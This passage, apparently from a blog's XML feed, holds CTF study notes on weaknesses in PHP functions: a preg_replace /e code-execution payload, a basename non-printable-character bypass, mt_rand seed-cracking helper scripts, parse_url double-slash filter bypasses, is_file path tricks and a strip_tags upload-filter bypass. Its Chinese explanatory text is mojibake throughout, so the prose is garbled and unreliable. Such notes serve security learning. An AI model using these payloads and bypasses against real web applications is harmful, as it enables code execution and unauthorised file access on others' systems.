å°†ä¼šåœæ­¢æœç´¢ã€‚</p></blockquote><p>æ¼æ´</p><p>1.å‚æ•°ä¸ºå­—ç¬¦ä¸²ï¼Œä¼ é€’æ•°ç»„è¿”å›false</p><p>2.<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">åˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡</a></p><p>phpä½ç‰ˆæœ¬</p><p>2.é&#x2F;sæ¨¡å¼ä¸‹ä¸åŒ¹é…æ¢è¡Œç¬¦%0a<br>3.é&#x2F;mæ¨¡å¼ä¸‹ä¸åŒ¹é…å¤šè¡Œ</p><h4 id="preg-replaceï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ›¿æ¢å­—ç¬¦ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ›¿æ¢æ¬¡æ•°ï¼‰"><a href="#preg-replaceï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ›¿æ¢å­—ç¬¦ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ›¿æ¢æ¬¡æ•°ï¼‰" class="headerlink" title="preg_replaceï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ›¿æ¢å­—ç¬¦ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ›¿æ¢æ¬¡æ•°ï¼‰"></a>preg_replaceï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ›¿æ¢å­—ç¬¦ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ›¿æ¢æ¬¡æ•°ï¼‰</h4><ol><li><p>æ›¿æ¢æ¬¡æ•°é»˜è®¤ä¸º1ï¼Œå¯ä»¥ç”¨åŒå†™ç»•è¿‡</p></li><li><p>&#x2F;eæ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œ ï¼ˆphp5.5ç‰ˆæœ¬ä»¥ä¸‹ï¼‰</p></li></ol><p>buuâ€“[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span>(<span class="params"><span class="variable">$regex</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span>.<span class="variable">$regex</span>.<span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$regex</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">complexStrtolower</span>(<span class="variable">$regex</span>, <span class="variable">$value</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨&#x2F;eæ¨¡å¼ä¸‹ï¼Œå¦‚æœæ­£åˆ™åŒ¹é…æˆåŠŸï¼Œå°±ä¼šæ‰§è¡Œpreg_replace()çš„ç¬¬äºŒä¸ªå‚æ•°</p><p>ç›¸å½“äº <strong>eval(â€˜strtolower(â€œ\1â€);â€™)</strong> </p><p>å¦‚ä½•åˆ©ç”¨\1å®ç°ä»£ç æ‰§è¡Œå‘¢ï¼Ÿ</p><p>æ³¨æ„åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æ‰€ä»£è¡¨çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ˜¯å°†åŒ¹é…åˆ°çš„å­—ç¬¦ä½œä¸ºæ•è·åˆ†ç»„ï¼Œè€Œæ•è·åˆ†ç»„ä¸‹æ ‡æ˜¯ä»1å¼€å§‹çš„ï¼Œå³åŒ¹é…åˆ°çš„å­—ç¬¦ä¼šä»£æ›¿\1â†’<strong>eval(â€˜strtolower(â€œpayloadâ€);â€™)</strong> </p><p><img src="file://E:\typora%20img\image-20220706125956030.png?lastModify=1657113567" alt="image-20220706125956030"></p><p>è¿˜æœ‰ä¸€ä¸ªæ³¨æ„ç‚¹æ˜¯â€payloadâ€æ˜¯ç”±åŒå¼•å·åŒ…å›´èµ·æ¥çš„ï¼Œå†é…åˆå¯å˜å˜é‡ï¼Œæ‰èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">\S*=$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125; </span><br><span class="line"></span><br><span class="line">\S*â†’<span class="variable">$regex</span> ç”¨äºæ­£åˆ™åŒ¹é…/æ•è·</span><br><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;â†’<span class="variable">$value</span> å¾…åŒ¹é…å­—ç¬¦</span><br><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;:è¦å°†å¾…åŒ¹é…å­—ç¬¦æ„é€ æˆå¯å˜å˜é‡çš„å½¢å¼æ‰å¯ä»¥æ‰§è¡Œ<span class="title function_ invoke__">phpinfo</span>()</span><br><span class="line">å¯å˜å˜é‡ï¼š</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$hello</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span>&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt; hello world</span><br></pre></td></tr></table></figure><h2 id="basename"><a href="#basename" class="headerlink" title="basename"></a>basename</h2><p><strong>basenameä¼šå¿½ç•¥ä¸€äº›å¥‡æ€ªçš„å­—ç¬¦<code>%80 ~ %ff</code>ã€‚</strong></p><p>buu â€”-[Zer0pts2020]Can you guess it?</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;config\.php\/*$&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®æ ‡ï¼šbasename($_SERVER[â€˜PHP_SELFâ€™]&#x3D;&#x3D;config.php</p><ol><li>éœ€è¦ç»•è¿‡è¿‡æ»¤config.php/*$ï¼Œ$åŒ¹é…æœ«å°¾ï¼Œæ‰€ä»¥åªè¦åœ¨config.phpåæ·»åŠ å­—ç¬¦å³å¯ç»•è¿‡ã€‚</li><li>$_SERVER[â€˜PHP_SELFâ€™]ï¼šè¿”å›çš„æ˜¯å½“å‰æ–‡ä»¶ç›¸å¯¹äºæ ¹ç›®å½•çš„è·¯å¾„host&#x2F;$_SERVER[â€œPHP_SELFâ€]å³url&#x3D;&#x3D;host&#x2F;$_SERVER[â€œPHP_SELFâ€]</li><li>basenameï¼šè¿”å›å½“å‰æ–‡ä»¶åå³æœ€åä¸€ä¸ª&#x2F;xxxä¸­çš„xxx</li></ol><p><img src="/../images/image-20220706205913114-1687432076955.png" alt="image-20220706205913114"></p><p>ä¸ºäº†ç»•è¿‡æ­£åˆ™ï¼Œéœ€è¦åœ¨1.phpååŠ å­—ç¬¦</p><p><img src="/../images/image-20220706210043797-1687432076955.png" alt="image-20220706210043797"></p><p>ä½†æ˜¯è¿™æ ·basenameåŒ¹é…åˆ°çš„å°±ä¸æ˜¯1.phpäº†</p><p>ä¸è¿‡basenameæœ‰ä¸€ä¸ªç‰¹æ€§å°±æ˜¯ï¼šå¦‚æœåŒ¹é…åˆ°çš„æ–‡ä»¶åå¤´æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œä¼šæŠŠå®ƒå¿½ç•¥æ‰</p><p><img src="/../images/image-20220706210252351-1687432076955.png" alt="image-20220706210252351"></p><p>è¿™æ ·basenameåŸå…ˆåŒ¹é…åˆ°çš„æ˜¯%81ï¼Œä½†æ˜¯%81æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œä¼šæŠŠå®ƒå¿½ç•¥æ‰ï¼Œæ‰€ä»¥å°±ä¼šå¾€å‰åŒ¹é…ï¼ŒåŒ¹é…åˆ°1.php</p><p><img src="/../images/image-20220706210555229-1687432076955.png" alt="image-20220706210555229"></p><h2 id="ä¼ªéšæœºæ•°"><a href="#ä¼ªéšæœºæ•°" class="headerlink" title="ä¼ªéšæœºæ•°"></a>ä¼ªéšæœºæ•°</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mt_srand(x):è®¾å®šéšæœºæ•°ç§å­ä¸ºx</span><br><span class="line">mt_rand(a,b):ç”Ÿæˆ[a,b]é—´çš„éšæœºæ•°</span><br></pre></td></tr></table></figure><p>éšæœºæ•°ç”Ÿæˆå‡½æ•°ï¼Œå®è´¨ä¸Šç”Ÿæˆçš„æ˜¯çº¿æ€§çš„ä¼ªéšæœºæ•°ï¼Œç®€å•æ¥è¯´å°±æ˜¯y&#x3D;axï¼Œxå°±æ˜¯ç§å­ï¼Œaæ˜¯èŒƒå›´ï¼Œyå°±æ˜¯ç”Ÿæˆçš„éšæœºæ•°ã€‚</p><p>æ‰€ä»¥åªè¦ç§å­å›ºå®šäº†ï¼Œæ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°éƒ½æ˜¯ç›¸åŒçš„ã€‚</p><ol><li><p>å·²çŸ¥åœ¨åŒä¸€ä¸ªç§å­ä¸‹ç”Ÿæˆçš„å¤šä¸ªéšæœºæ•°</p><p><a href="https://blog.csdn.net/weixin_34255793/article/details/92713300">https://blog.csdn.net/weixin_34255793/article/details/92713300</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨php_mt_seedå¯¹ç¬¬ä¸€ä¸ªéšæœºæ•°è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°å¯èƒ½çš„ç§å­ï¼ˆå› ä¸ºç¬¬ä¸€æ¬¡è°ƒç”¨mt_rand()å‡½æ•°çš„æ—¶å€™ç§å­å°±ç¡®å®šä¸‹æ¥äº†ï¼‰</span><br><span class="line">ç„¶åç”¨å¾—åˆ°çš„ç§å­æ¥ç”Ÿæˆéšæœºæ•°ï¼Œè¿›è¡Œæ¯”å¯¹å³å¯å¾—åˆ°æ­£ç¡®çš„ç§å­</span><br></pre></td></tr></table></figure></li><li><p>å·²çŸ¥ç¬¬ä¸€ä¸ªéšæœºæ•°</p><p><a href="https://blog.csdn.net/qq_52907838/article/details/119824220">https://blog.csdn.net/qq_52907838/article/details/119824220</a></p><p>php_mt_seedä¸­ç»™å‡ºçš„æ–¹æ³•</p><p><img src="/../images/image-20220708120301114-1687432076956.png" alt="image-20220708120301114"></p><p>å¯¹åº”è„šæœ¬</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass_now</span> = <span class="string">&quot;Unclt9Kr75&quot;</span>;<span class="comment">//ç¬¬ä¸€ä¸ªéšæœºæ•°çš„å‰åä½</span></span><br><span class="line"><span class="variable">$allowable_characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$allowable_characters</span>) - <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$pass_now</span>); <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_now</span>[<span class="variable">$j</span>] == <span class="variable">$allowable_characters</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 <span class="subst">$length</span> &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass_now</span> = <span class="string">&quot;KVQP0LdJKRaV3n9D&quot;</span>;<span class="comment">//å®Œæ•´çš„éšæœºæ•°</span></span><br><span class="line"><span class="variable">$allowable_characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$allowable_characters</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$length</span>-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$pass_now</span>); <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_now</span>[<span class="variable">$j</span>] == <span class="variable">$allowable_characters</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 <span class="subst">$a</span> &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="/../images/image-20220708120520631-1687432076956.png" alt="image-20220708120520631"></p><p>å…³äºphp_mt_seed <a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a></p><h2 id="SERVERå˜é‡ç¼ºé™·"><a href="#SERVERå˜é‡ç¼ºé™·" class="headerlink" title="$_SERVERå˜é‡ç¼ºé™·"></a>$_SERVERå˜é‡ç¼ºé™·</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_SERVER[QUERY_STRING]  &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_REQUEST  &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_SERVER  &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220717130225205-1687432076956.png" alt="image-20220717130225205"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;]ï¼šè¿”å›çš„æ˜¯å½“å‰æ–‡ä»¶ç›¸å¯¹äºæ ¹ç›®å½•çš„è·¯å¾„host/$_SERVER[&quot;PHP_SELF&quot;]å³url==host/$_SERVER[&quot;PHP_SELF&quot;]</span><br></pre></td></tr></table></figure><h2 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h2><p>ä½¿ç”¨æ–¹æ³•</p><blockquote><p>ç”¨äºè§£æurlï¼Œè·å¾—urlçš„ç»„æˆéƒ¨åˆ†</p></blockquote><p><img src="/../images/image-20220204213349476-1687432076956.png" alt="image-20220204213349476"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.zcool.com.cn/suning?p=69#tab_anchor&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$parts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$parts</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">http:<span class="comment">//www.zcool.com.cn/suning?p=69#tab_anchor&lt;/br&gt;array(5) &#123;</span></span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;www.zcool.com.cn&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;/suning&quot;</span></span><br><span class="line">  [<span class="string">&quot;query&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;p=69&quot;</span></span><br><span class="line">  [<span class="string">&quot;fragment&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;tab_anchor&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´</p><blockquote><p>ä¸åº”è¯¥å°†å…¶ä½œä¸ºæ£€éªŒurlæ˜¯å¦åˆæ³•çš„æ‰‹æ®µ</p></blockquote><ol><li><p>è§£æå¤±è´¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/test/1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$filter</span>=<span class="keyword">array</span>(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;qqqq&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$filter</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$f</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$data</span>[<span class="string">&#x27;query&#x27;</span>]))</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Attack Detected&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test/1.php?aaa=1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807105935728-1687432076957.png" alt="image-20220807105935728"></p><blockquote><p>æˆ‘ä»¬æŸ¥è¯¢çš„å­—ç¬¦ä¸²è¢«æ‹¦æˆªï¼Œæ²¡æœ‰è¾“å‡ºa&#x3D;1</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1///test/1.php?aaa=1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807111314350-1687432076957.png" alt="image-20220807111314350"></p><blockquote><p>åœ¨æ­£å¸¸è·¯å¾„å‰åŠ ä¸Š&#x2F;&#x2F;ï¼Œparse_urlå°±ä¼šè§£æå¤±è´¥ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤ï¼ŒæˆåŠŸè¾“å‡ºa&#x3D;1</p></blockquote></li><li><p>ç«¯å£è§£æé”™è¯¯</p><blockquote><p>php5.5ä»¥ä¸Š</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&#x27;//pupiles.com/about:1234&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$test</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;pupiles.com&quot;</span></span><br><span class="line">  [<span class="string">&quot;port&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1234</span>)</span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;/about:1234&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>parse_urlè§£æå‡ºäº†ç«¯å£å·ï¼Œè®¤ä¸ºè®¿é—®çš„æ˜¯pupiles.comçš„1234ç«¯å£ä¸‹çš„about:1234æ–‡ä»¶ï¼Œè€Œå®é™…ä¸Šæ˜¯è®¿é—®pupiles.comä¸‹çš„about:1234æ–‡ä»¶</p></blockquote></li><li><p>è·¯å¾„è§£æé”™è¯¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;/upload&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$uri</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">// doubleslash case</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;//upload&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$uri</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [path] =&gt; /upload</span><br><span class="line">)</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [host] =&gt; upload</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>å¯ä»¥çœ‹åˆ°parse_urlè§£ææ—¶ï¼Œ&#x2F;xxxè§£æä¸ºè·¯å¾„ï¼Œ&#x2F;&#x2F;xxxè§£æä¸ºä¸»æœº</p></blockquote></li></ol><h2 id="is-file"><a href="#is-file" class="headerlink" title="is_file"></a>is_file</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span> == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ä¼ªåè®®  is_fileæ£€æµ‹é™¤äº†fileå¤–çš„ä¼ªåè®®éƒ½æ˜¯false    </li><li>å‡ç›®å½•   <code>./xxx/../f14g.php </code></li></ul><h2 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags"></a>strip_tags</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]  = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]=<span class="number">1</span>.&lt;&gt;php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPååºåˆ—åŒ–</title>
      <link href="/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
